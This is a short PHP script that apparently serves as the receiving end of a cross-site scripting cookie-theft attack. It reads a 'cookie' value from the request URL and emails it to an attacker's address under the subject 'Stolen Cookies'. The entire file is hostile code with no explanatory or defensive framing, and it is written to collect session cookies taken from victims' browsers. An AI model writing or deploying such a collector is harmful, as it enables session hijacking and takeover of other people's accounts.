<?php
$cookie = $HTTP_GET_VARS[“cookie”]; mail(“hackerid@mailprovider.com”, “Stolen Cookies”, $cookie); 
?>
